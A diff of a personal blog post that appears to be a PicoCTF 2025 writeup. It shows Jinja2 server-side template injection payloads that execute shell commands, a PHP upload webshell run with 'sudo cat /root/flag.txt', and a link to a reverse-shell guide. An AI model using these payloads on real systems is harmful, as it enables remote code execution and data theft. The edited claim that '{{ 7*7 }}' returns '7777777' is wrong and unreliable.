@@ -1,9 +1,21 @@
 ---
 title: PicoCTF2025
-date: '2016-03-08'
+date: '2025-02-01'
 draft: false
-summary: Example of a markdown file with code blocks and syntax highlighting
+summary: Writeup
+layout: PostBanner
+images: ['/static/images/pico.jpg']
 ---
+
+Here you'll find writeups for how I solved the challenges from PicoCTF 2025, across all categories — from web and pwn to reverse engineering, crypto, and more.
+Each writeup includes my thought process, techniques, and the final solution.
+
+<TOCInline
+  toc={props.toc}
+  exclude={['Bypassing Filters', 'Identifying the Template Engine', 'Exploitation']}
+/>
+
+# WEB
 
 ## SSTI1
 
@@ -13,19 +25,19 @@ From the challenge title, it's clear that we're dealing with **Server-Side Templ
 
 Here are some basic payloads for different template engines:
 
-![template-decision-tree](/static/images/template-decision-tree.png)
+![template-decision-tree](/static/images/pico2025/template-decision-tree.png)
 
-After testing these, the one that works is `{{ 7*7 }}`, returning `49`, confirming the engine is **Jinja2**.
+After testing these, the one that works is `{{ 7*7 }}`, which returns `7777777`, confirming the engine is **Jinja2**.
 
 ## Exploitation
 
-To confirm command execution, I try:
+To confirm command execution, I tried:
 
 ```jinja
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
 ```
 
-It works! Then I go ahead and read the flag:
+It works! Then I proceed to read the flag:
 
 ```jinja
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
@@ -33,7 +45,7 @@ It works! Then I go ahead and read the flag:
 
 And successfully retrieve the flag.
 
-> Helpful source: [SSTI Server Side Template Injection - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)
+> Reference: [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
 
 ---
 
@@ -46,9 +58,9 @@ In the second challenge, the vulnerability is confirmed using:
 ```
 
 Which returns: `7777777`  
-This again confirms SSTI.
+This again confirms an SSTI vulnerability.
 
-### Bypassing Filters
+## Bypassing Filters
 
 I found this obfuscated payload that bypasses filters and still achieves code execution:
 
@@ -64,4 +76,44 @@ Then I modify it to read the flag:
 
 > Reference: [Server Side Template Injection with Jinja2 - OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
 
-> Reference: [Port Swigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
+> Helpful source: [SSTI Server Side Template Injection - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)
+
+---
+
+## n0s4n1ty 1
+
+This challenge is vulnerable to uploading `.php` files instead of images. I simply inject PHP code to open a shell. (See the reference link below for a sample reverse shell.)
+
+I know uploaded files are stored in `/uploads`, so I execute the command:
+
+```
+/uploads/index.php?cmd=sudo cat /root/flag.txt
+```
+
+- `index.php` is the name of my uploaded file.
+- I assumed the flag was in `/root`, which turned out to be correct.
+
+> Helpful source: [Simple PHP reverse shell](https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d)
+
+---
+
+## HEAD-DUMP
+
+This challenge gives a pretty useful hint in the description: exploit the blog API.
+
+```txt
+The application is a simple blog website where you can read articles about various topics, including an article about API Documentation.
+```
+
+Among the articles, you’ll find a link to the API GUI. We know the flag is stored in the server memory, so we use the final GET request in the list.  
+Accessing the corresponding URL, we download the file and find the flag.
+
+---
+
+# BINARY EXPLOITATION
+
+## Soon
+
+# FORSENSICS
+
+## Soon
